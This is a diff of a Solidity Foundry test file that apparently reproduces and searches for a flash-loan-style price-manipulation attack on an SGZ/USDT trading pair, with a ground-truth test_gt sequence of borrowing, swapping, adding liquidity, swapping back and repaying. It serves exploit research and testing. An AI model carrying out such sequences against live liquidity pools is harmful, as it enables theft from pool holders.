@@ -210,7 +210,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_usdt_sgz(amt1, amt2);
         swap_pair_attacker_sgz_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -229,7 +229,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_usdt_sgz(amt1, amt2);
         swap_pair_attacker_sgz_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -250,7 +250,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_usdt_sgz(amt3, amt4);
         swap_pair_attacker_sgz_usdt(amt5, amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -269,7 +269,7 @@ contract SGZTest is Test, BlockLoader {
         addliquidity_sgz_pair_sgz_usdt();
         swap_pair_attacker_sgz_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -290,7 +290,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_sgz_sgz_usdt(amt3, amt4);
         swap_pair_attacker_sgz_usdt(amt5, amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -311,7 +311,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_sgz_usdt(amt3, amt4);
         swap_pair_sgz_sgz_usdt(amt5, amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -329,7 +329,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_sgz_usdt(amt1, amt2);
         swap_pair_attacker_usdt_sgz(amt3, amt4);
         payback_sgz_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -348,7 +348,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_sgz_usdt(amt1, amt2);
         swap_pair_attacker_usdt_sgz(amt3, amt4);
         payback_sgz_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -369,7 +369,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_sgz_usdt(amt3, amt4);
         swap_pair_attacker_usdt_sgz(amt5, amt6);
         payback_sgz_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -388,7 +388,7 @@ contract SGZTest is Test, BlockLoader {
         addliquidity_sgz_pair_sgz_usdt();
         swap_pair_attacker_usdt_sgz(amt3, amt4);
         payback_sgz_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -409,7 +409,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_sgz_sgz_usdt(amt3, amt4);
         swap_pair_attacker_usdt_sgz(amt5, amt6);
         payback_sgz_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -433,7 +433,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_usdt_sgz(amt5, amt6);
         swap_pair_attacker_sgz_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -458,7 +458,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_usdt_sgz(amt5, amt6);
         swap_pair_attacker_sgz_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -485,7 +485,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_usdt_sgz(amt7, amt8);
         swap_pair_attacker_sgz_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -510,7 +510,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_usdt_sgz(amt5, amt6);
         swap_pair_attacker_sgz_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -537,7 +537,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_usdt_sgz(amt7, amt8);
         swap_pair_attacker_sgz_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -562,7 +562,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_usdt_sgz(amt5, amt6);
         swap_pair_attacker_sgz_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -589,7 +589,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_usdt_sgz(amt7, amt8);
         swap_pair_attacker_sgz_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -614,7 +614,7 @@ contract SGZTest is Test, BlockLoader {
         addliquidity_sgz_pair_sgz_usdt();
         swap_pair_attacker_sgz_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -641,7 +641,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_sgz_sgz_usdt(amt7, amt8);
         swap_pair_attacker_sgz_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -668,7 +668,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_sgz_usdt(amt7, amt8);
         swap_pair_sgz_sgz_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -692,7 +692,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_sgz_usdt(amt5, amt6);
         swap_pair_attacker_usdt_sgz(amt7, amt8);
         payback_sgz_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -717,7 +717,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_sgz_usdt(amt5, amt6);
         swap_pair_attacker_usdt_sgz(amt7, amt8);
         payback_sgz_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -744,7 +744,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_sgz_usdt(amt7, amt8);
         swap_pair_attacker_usdt_sgz(amt9, amt10);
         payback_sgz_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -769,7 +769,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_sgz_usdt(amt5, amt6);
         swap_pair_attacker_usdt_sgz(amt7, amt8);
         payback_sgz_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -796,7 +796,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_sgz_usdt(amt7, amt8);
         swap_pair_attacker_usdt_sgz(amt9, amt10);
         payback_sgz_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -821,7 +821,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_sgz_usdt(amt5, amt6);
         swap_pair_attacker_usdt_sgz(amt7, amt8);
         payback_sgz_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -848,7 +848,7 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_attacker_sgz_usdt(amt7, amt8);
         swap_pair_attacker_usdt_sgz(amt9, amt10);
         payback_sgz_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -873,7 +873,7 @@ contract SGZTest is Test, BlockLoader {
         addliquidity_sgz_pair_sgz_usdt();
         swap_pair_attacker_usdt_sgz(amt7, amt8);
         payback_sgz_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -900,14 +900,20 @@ contract SGZTest is Test, BlockLoader {
         swap_pair_sgz_sgz_usdt(amt7, amt8);
         swap_pair_attacker_usdt_sgz(amt9, amt10);
         payback_sgz_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 100e18);
         borrow_usdt_owner(100e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", usdt.balanceOf(attacker));
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
+        );
         swap_pair_attacker_usdt_sgz(
             usdt.balanceOf(attacker),
             pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
@@ -915,11 +921,17 @@ contract SGZTest is Test, BlockLoader {
         printBalance("After step1 ");
         addliquidity_sgz_pair_sgz_usdt();
         printBalance("After step2 ");
+        emit log_named_uint("amt3", sgz.balanceOf(attacker));
+        emit log_named_uint(
+            "amt4",
+            pair.getAmountOut(sgz.balanceOf(attacker), address(sgz))
+        );
         swap_pair_attacker_sgz_usdt(
             sgz.balanceOf(attacker),
             pair.getAmountOut(sgz.balanceOf(attacker), address(sgz))
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt5", (100e18 * 1003) / 1000);
         payback_usdt_owner((100e18 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -941,7 +953,7 @@ contract SGZTest is Test, BlockLoader {
         addliquidity_sgz_pair_sgz_usdt();
         swap_pair_attacker_sgz_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
